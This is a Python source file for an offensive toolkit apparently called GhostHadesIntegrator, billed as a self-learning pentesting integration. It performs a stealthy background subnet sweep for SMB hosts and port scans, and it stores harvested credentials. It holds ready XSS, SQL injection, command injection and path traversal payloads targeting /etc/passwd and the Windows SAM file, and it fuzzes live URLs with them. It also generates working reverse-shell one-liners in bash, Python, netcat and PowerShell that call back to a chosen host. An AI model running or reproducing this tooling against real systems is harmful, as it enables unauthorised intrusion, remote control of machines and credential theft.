"""
GhostHadesIntegrator - HadesAI Integration for GhostWhisper Suite
Bridges HadesAI's self-learning pentesting capabilities with GhostWhisper operations

💝 Support Development: https://buy.stripe.com/28EbJ1f7ceo3ckyeES5kk00
"""

import os
import sys
import json
import sqlite3
import hashlib
import threading
import logging
import time
import socket
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from collections import defaultdict
import re

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [GhostHades] %(levelname)s - %(message)s')
logger = logging.getLogger("GhostHadesIntegrator")

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class GhostExperience:
    """Experience record for learning from operations"""
    id: str
    operation: str
    target: str
    result: str
    success: bool
    reward: float
    timestamp: datetime
    ghost_tag: str
    metadata: Dict = field(default_factory=dict)


@dataclass
class SecurityFinding:
    """Security finding from reconnaissance"""
    finding_id: str
    target: str
    finding_type: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    description: str
    evidence: str
    remediation: str
    discovered_by: str  # Module that found it
    ghost_tag: str
    timestamp: datetime = field(default_factory=datetime.now)


@dataclass
class ExploitPayload:
    """Generated exploit payload"""
    payload_id: str
    payload_type: str  # XSS, SQLi, Command Injection, etc.
    payload: str
    target_context: str
    success_rate: float
    uses: int = 0
    last_used: Optional[datetime] = None


# ============================================================================
# KNOWLEDGE BASE - SQLite-backed persistence
# ============================================================================

class GhostKnowledgeBase:
    """Persistent knowledge storage for GhostWhisper operations"""
    
    def __init__(self, db_path: str = "ghostwhisper_hades.db"):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.lock = threading.Lock()
        self._init_db()
        logger.info(f"GhostKnowledgeBase initialized: {db_path}")
    
    def _init_db(self):
        cursor = self.conn.cursor()
        
        # Experiences table - learning from operations
        cursor.execute('''CREATE TABLE IF NOT EXISTS experiences (
            id TEXT PRIMARY KEY,
            operation TEXT,
            target TEXT,
            result TEXT,
            success INTEGER,
            reward REAL,
            timestamp TEXT,
            ghost_tag TEXT,
            metadata TEXT
        )''')
        
        # Security findings table
        cursor.execute('''CREATE TABLE IF NOT EXISTS security_findings (
            finding_id TEXT PRIMARY KEY,
            target TEXT,
            finding_type TEXT,
            severity TEXT,
            description TEXT,
            evidence TEXT,
            remediation TEXT,
            discovered_by TEXT,
            ghost_tag TEXT,
            timestamp TEXT
        )''')
        
        # Exploit payloads table
        cursor.execute('''CREATE TABLE IF NOT EXISTS exploit_payloads (
            payload_id TEXT PRIMARY KEY,
            payload_type TEXT,
            payload TEXT,
            target_context TEXT,
            success_rate REAL,
            uses INTEGER,
            last_used TEXT
        )''')
        
        # Network hosts discovered
        cursor.execute('''CREATE TABLE IF NOT EXISTS discovered_hosts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            hostname TEXT,
            os_fingerprint TEXT,
            open_ports TEXT,
            services TEXT,
            vulnerabilities TEXT,
            ghost_tag TEXT,
            discovered_at TEXT
        )''')
        
        # Credentials harvested
        cursor.execute('''CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT,
            credential_type TEXT,
            username TEXT,
            credential_hash TEXT,
            source TEXT,
            ghost_tag TEXT,
            harvested_at TEXT
        )''')
        
        # Learned patterns from operations
        cursor.execute('''CREATE TABLE IF NOT EXISTS learned_patterns (
            pattern_id TEXT PRIMARY KEY,
            pattern_type TEXT,
            signature TEXT,
            confidence REAL,
            occurrences INTEGER,
            examples TEXT,
            ghost_tag TEXT,
            learned_at TEXT
        )''')
        
        self.conn.commit()
    
    def store_experience(self, exp: GhostExperience):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''INSERT OR REPLACE INTO experiences 
                VALUES (?,?,?,?,?,?,?,?,?)''',
                (exp.id, exp.operation, exp.target, exp.result,
                 1 if exp.success else 0, exp.reward, 
                 exp.timestamp.isoformat(), exp.ghost_tag,
                 json.dumps(exp.metadata)))
            self.conn.commit()
    
    def store_finding(self, finding: SecurityFinding):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''INSERT OR REPLACE INTO security_findings
                VALUES (?,?,?,?,?,?,?,?,?,?)''',
                (finding.finding_id, finding.target, finding.finding_type,
                 finding.severity, finding.description, finding.evidence,
                 finding.remediation, finding.discovered_by, finding.ghost_tag,
                 finding.timestamp.isoformat()))
            self.conn.commit()
    
    def store_payload(self, payload: ExploitPayload):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''INSERT OR REPLACE INTO exploit_payloads
                VALUES (?,?,?,?,?,?,?)''',
                (payload.payload_id, payload.payload_type, payload.payload,
                 payload.target_context, payload.success_rate, payload.uses,
                 payload.last_used.isoformat() if payload.last_used else None))
            self.conn.commit()
    
    def store_discovered_host(self, host_data: Dict, ghost_tag: str):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''INSERT INTO discovered_hosts
                (ip, hostname, os_fingerprint, open_ports, services, vulnerabilities, ghost_tag, discovered_at)
                VALUES (?,?,?,?,?,?,?,?)''',
                (host_data.get('ip'), host_data.get('hostname'),
                 host_data.get('os'), json.dumps(host_data.get('ports', [])),
                 json.dumps(host_data.get('services', {})),
                 json.dumps(host_data.get('vulns', [])), ghost_tag,
                 datetime.now().isoformat()))
            self.conn.commit()
    
    def get_findings(self, ghost_tag: str = None, severity: str = None, limit: int = 100) -> List[Dict]:
        cursor = self.conn.cursor()
        query = 'SELECT * FROM security_findings WHERE 1=1'
        params = []
        
        if ghost_tag:
            query += ' AND ghost_tag = ?'
            params.append(ghost_tag)
        if severity:
            query += ' AND severity = ?'
            params.append(severity)
        
        query += ' ORDER BY timestamp DESC LIMIT ?'
        params.append(limit)
        
        cursor.execute(query, params)
        return [dict(zip([col[0] for col in cursor.description], row)) 
                for row in cursor.fetchall()]
    
    def get_payloads_by_type(self, payload_type: str, limit: int = 20) -> List[Dict]:
        cursor = self.conn.cursor()
        cursor.execute('''SELECT * FROM exploit_payloads 
            WHERE payload_type = ? ORDER BY success_rate DESC LIMIT ?''',
            (payload_type, limit))
        return [dict(zip([col[0] for col in cursor.description], row)) 
                for row in cursor.fetchall()]
    
    def get_stats(self) -> Dict:
        cursor = self.conn.cursor()
        stats = {}
        
        tables = ['experiences', 'security_findings', 'exploit_payloads', 
                  'discovered_hosts', 'credentials', 'learned_patterns']
        
        for table in tables:
            cursor.execute(f'SELECT COUNT(*) FROM {table}')
            stats[table] = cursor.fetchone()[0]
        
        # Severity breakdown
        cursor.execute('SELECT severity, COUNT(*) FROM security_findings GROUP BY severity')
        stats['findings_by_severity'] = dict(cursor.fetchall())
        
        return stats


# ============================================================================
# NETWORK MONITOR - Passive network reconnaissance
# ============================================================================

class GhostNetworkMonitor:
    """Network monitoring and reconnaissance module"""
    
    def __init__(self, kb: GhostKnowledgeBase):
        self.kb = kb
        self.active = False
        self.learning_mode = False
        self.defense_mode = False
        self.discovered_hosts = {}
        self.monitor_thread = None
        self.ghost_tag = None
    
    def set_learning_mode(self, enabled: bool):
        self.learning_mode = enabled
        logger.info(f"Learning mode: {'enabled' if enabled else 'disabled'}")
    
    def set_defense_mode(self, enabled: bool):
        self.defense_mode = enabled
        logger.info(f"Defense mode: {'enabled' if enabled else 'disabled'}")
    
    def start(self, ghost_tag: str = "Gx01"):
        self.ghost_tag = ghost_tag
        self.active = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.monitor_thread.start()
        logger.info("Network monitor started")
    
    def stop(self):
        self.active = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
        logger.info("Network monitor stopped")
    
    def _monitor_loop(self):
        while self.active:
            try:
                # Passive network discovery
                self._discover_local_network()
                time.sleep(30)  # Check every 30 seconds
            except Exception as e:
                logger.error(f"Monitor error: {e}")
                time.sleep(10)
    
    def _discover_local_network(self):
        """Discover hosts on local network"""
        try:
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            subnet = '.'.join(local_ip.split('.')[:-1])
            
            # Quick ping sweep (limited range for stealth)
            for i in range(1, 20):
                if not self.active:
                    break
                    
                ip = f"{subnet}.{i}"
                if ip == local_ip:
                    continue
                
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((ip, 445))  # SMB port
                    sock.close()
                    
                    if result == 0:
                        host_data = {
                            'ip': ip,
                            'hostname': self._resolve_hostname(ip),
                            'ports': [445],
                            'services': {'445': 'SMB'}
                        }
                        
                        if ip not in self.discovered_hosts:
                            self.discovered_hosts[ip] = host_data
                            self.kb.store_discovered_host(host_data, self.ghost_tag)
                            logger.info(f"Discovered host: {ip}")
                            
                except:
                    pass
                    
        except Exception as e:
            logger.debug(f"Network discovery error: {e}")
    
    def _resolve_hostname(self, ip: str) -> str:
        try:
            hostname, _, _ = socket.gethostbyaddr(ip)
            return hostname
        except:
            return "Unknown"
    
    def scan_target(self, target: str, ports: List[int] = None) -> Dict:
        """Scan a specific target for open ports"""
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 
                     993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443]
        
        results = {
            'target': target,
            'ip': None,
            'hostname': None,
            'open_ports': [],
            'services': {},
            'scan_time': datetime.now().isoformat()
        }
        
        try:
            # Resolve target
            if re.match(r'\d+\.\d+\.\d+\.\d+', target):
                results['ip'] = target
                results['hostname'] = self._resolve_hostname(target)
            else:
                results['ip'] = socket.gethostbyname(target)
                results['hostname'] = target
            
            # Port scan
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((results['ip'], port))
                    sock.close()
                    
                    if result == 0:
                        results['open_ports'].append(port)
                        results['services'][str(port)] = self._identify_service(port)
                        
                except:
                    pass
            
            # Store in knowledge base
            if results['open_ports']:
                self.kb.store_discovered_host(results, self.ghost_tag)
                
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def _identify_service(self, port: int) -> str:
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS',
            445: 'SMB', 993: 'IMAPS', 995: 'POP3S', 1433: 'MSSQL', 1521: 'Oracle',
            3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
            8080: 'HTTP-Alt', 8443: 'HTTPS-Alt'
        }
        return services.get(port, 'Unknown')


# ============================================================================
# EXPLOITATION ENGINE - Payload generation and testing
# ============================================================================

class GhostExploitationEngine:
    """Generate and manage exploit payloads"""
    
    # Common payload templates
    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '${alert(1)}',
        '{{constructor.constructor("alert(1)")()}}',
    ]
    
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "1' ORDER BY 1--",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "1; WAITFOR DELAY '0:0:5'--",
    ]
    
    CMD_INJECTION_PAYLOADS = [
        "; whoami",
        "| whoami",
        "& whoami",
        "`whoami`",
        "$(whoami)",
        "|| whoami",
        "&& whoami",
    ]
    
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    ]
    
    def __init__(self, kb: GhostKnowledgeBase = None):
        self.kb = kb
        self.payloads_used = defaultdict(int)
    
    def generate_payloads(self, attack_type: str, context: str = "") -> List[Dict]:
        """Generate payloads for a specific attack type"""
        
        payloads = []
        
        if attack_type.lower() in ['xss', 'cross-site scripting']:
            base_payloads = self.XSS_PAYLOADS
        elif attack_type.lower() in ['sqli', 'sql injection', 'sql']:
            base_payloads = self.SQLI_PAYLOADS
        elif attack_type.lower() in ['cmd', 'command', 'rce', 'command injection']:
            base_payloads = self.CMD_INJECTION_PAYLOADS
        elif attack_type.lower() in ['lfi', 'path traversal', 'directory traversal']:
            base_payloads = self.PATH_TRAVERSAL_PAYLOADS
        else:
            base_payloads = self.XSS_PAYLOADS  # Default to XSS
        
        for payload in base_payloads:
            payload_id = hashlib.md5(f"{attack_type}:{payload}".encode()).hexdigest()[:12]
            
            payloads.append({
                'payload_id': payload_id,
                'type': attack_type,
                'payload': payload,
                'encoded': self._encode_payload(payload),
                'context': context
            })
        
        return payloads
    
    def _encode_payload(self, payload: str) -> Dict[str, str]:
        """Generate multiple encodings of a payload"""
        import urllib.parse
        import base64
        
        return {
            'url': urllib.parse.quote(payload),
            'double_url': urllib.parse.quote(urllib.parse.quote(payload)),
            'base64': base64.b64encode(payload.encode()).decode(),
            'hex': payload.encode().hex(),
        }
    
    def fuzz_parameter(self, url: str, param: str, payloads: List[str], 
                       method: str = "GET") -> List[Dict]:
        """Fuzz a parameter with payloads"""
        results = []
        
        try:
            import requests
            session = requests.Session()
            session.verify = False
            
            for payload in payloads:
                try:
                    if method.upper() == "GET":
                        test_url = f"{url}?{param}={payload}"
                        response = session.get(test_url, timeout=10)
                    else:
                        response = session.post(url, data={param: payload}, timeout=10)
                    
                    # Check for interesting responses
                    interesting = False
                    indicators = []
                    
                    if payload in response.text:
                        interesting = True
                        indicators.append('payload_reflected')
                    
                    if 'error' in response.text.lower() or 'exception' in response.text.lower():
                        interesting = True
                        indicators.append('error_message')
                    
                    if response.status_code >= 500:
                        interesting = True
                        indicators.append('server_error')
                    
                    results.append({
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'interesting': interesting,
                        'indicators': indicators
                    })
                    
                    self.payloads_used[payload] += 1
                    
                except Exception as e:
                    results.append({
                        'payload': payload,
                        'error': str(e)
                    })
                    
        except ImportError:
            logger.warning("requests library not available for fuzzing")
        
        return results
    
    def generate_reverse_shell(self, ip: str, port: int, shell_type: str = "bash") -> str:
        """Generate reverse shell payload"""
        
        shells = {
            'bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'nc': f"nc -e /bin/sh {ip} {port}",
            'powershell': f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        }
        
        return shells.get(shell_type.lower(), shells['bash'])


# ============================================================================
# MAIN INTEGRATOR CLASS
# ============================================================================

class GhostWhisperHadesIntegrator:
    """
    Main integration class connecting HadesAI capabilities to GhostWhisper Suite
    """
    
    def __init__(self, db_path: str = "ghostwhisper_hades.db"):
        self.kb = GhostKnowledgeBase(db_path)
        self.network_monitor = GhostNetworkMonitor(self.kb)
        self.exploit_engine = GhostExploitationEngine(self.kb)
        self.ghost_tag = None
        self.active = False
        
        logger.info("=" * 50)
        logger.info("🔥 GHOST-HADES INTEGRATOR INITIALIZED")
        logger.info("=" * 50)
    
    def initialize(self, ghost_tag: str = "Gx01"):
        """Initialize the integrator with a ghost tag"""
        self.ghost_tag = ghost_tag
        self.active = True
        logger.info(f"Integrator active with tag: {ghost_tag}")
        return True
    
    def start_monitoring(self, learning: bool = True, defense: bool = True):
        """Start network monitoring"""
        self.network_monitor.set_learning_mode(learning)
        self.network_monitor.set_defense_mode(defense)
        self.network_monitor.start(self.ghost_tag)
    
    def stop_monitoring(self):
        """Stop network monitoring"""
        self.network_monitor.stop()
    
    def scan_target(self, target: str, scan_type: str = "quick") -> Dict:
        """Perform reconnaissance on a target"""
        results = {
            'target': target,
            'scan_type': scan_type,
            'ghost_tag': self.ghost_tag,
            'started_at': datetime.now().isoformat(),
            'findings': []
        }
        
        # Network scan
        logger.info(f"Scanning target: {target}")
        net_results = self.network_monitor.scan_target(target)
        results['network'] = net_results
        
        # Store experience
        exp = GhostExperience(
            id=hashlib.md5(f"{target}:{datetime.now().isoformat()}".encode()).hexdigest()[:16],
            operation="scan",
            target=target,
            result=json.dumps(net_results),
            success=bool(net_results.get('open_ports')),
            reward=len(net_results.get('open_ports', [])) * 0.1,
            timestamp=datetime.now(),
            ghost_tag=self.ghost_tag,
            metadata={'scan_type': scan_type}
        )
        self.kb.store_experience(exp)
        
        results['completed_at'] = datetime.now().isoformat()
        return results
    
    def generate_attack_payloads(self, attack_type: str, target_context: str = "") -> List[Dict]:
        """Generate exploit payloads for a specific attack type"""
        return self.exploit_engine.generate_payloads(attack_type, target_context)
    
    def run_exploit_check(self, url: str, param: str = "cmd") -> List[Dict]:
        """Run basic exploit checks on a URL"""
        payloads = self.exploit_engine.generate_payloads("command")
        return self.exploit_engine.fuzz_parameter(
            url=url,
            param=param,
            payloads=[p['payload'] for p in payloads]
        )
    
    def get_stats(self) -> Dict:
        """Get current statistics"""
        return self.kb.get_stats()
    
    def get_findings(self, severity: str = None) -> List[Dict]:
        """Get security findings"""
        return self.kb.get_findings(self.ghost_tag, severity)
    
    def store_finding(self, finding_type: str, target: str, severity: str,
                      description: str, evidence: str = "", discovered_by: str = "GhostWhisper"):
        """Store a security finding"""
        finding = SecurityFinding(
            finding_id=hashlib.md5(f"{target}:{finding_type}:{datetime.now().isoformat()}".encode()).hexdigest()[:16],
            target=target,
            finding_type=finding_type,
            severity=severity,
            description=description,
            evidence=evidence,
            remediation="",
            discovered_by=discovered_by,
            ghost_tag=self.ghost_tag
        )
        self.kb.store_finding(finding)
        logger.info(f"Finding stored: {finding_type} on {target} [{severity}]")
    
    def shutdown(self):
        """Clean shutdown"""
        self.stop_monitoring()
        self.active = False
        logger.info("GhostHadesIntegrator shutdown complete")


# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def main():
    """CLI entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description="GhostWhisper-HadesAI Integration")
    parser.add_argument('--target', '-t', help='Target to scan')
    parser.add_argument('--tag', default='Gx01', help='Ghost tag')
    parser.add_argument('--monitor', action='store_true', help='Start network monitoring')
    parser.add_argument('--payloads', help='Generate payloads (xss|sqli|cmd|lfi)')
    parser.add_argument('--stats', action='store_true', help='Show statistics')
    
    args = parser.parse_args()
    
    integrator = GhostWhisperHadesIntegrator()
    integrator.initialize(args.tag)
    
    try:
        if args.monitor:
            print("[*] Starting network monitor (Ctrl+C to stop)...")
            integrator.start_monitoring()
            while True:
                time.sleep(1)
        
        elif args.target:
            print(f"[*] Scanning target: {args.target}")
            results = integrator.scan_target(args.target)
            print(json.dumps(results, indent=2))
        
        elif args.payloads:
            print(f"[*] Generating {args.payloads} payloads...")
            payloads = integrator.generate_attack_payloads(args.payloads)
            for p in payloads:
                print(f"  - {p['payload']}")
        
        elif args.stats:
            stats = integrator.get_stats()
            print("[*] GhostHades Statistics:")
            for key, value in stats.items():
                print(f"  {key}: {value}")
        
        else:
            parser.print_help()
            
    except KeyboardInterrupt:
        print("\n[*] Interrupted")
    finally:
        integrator.shutdown()


if __name__ == "__main__":
    main()
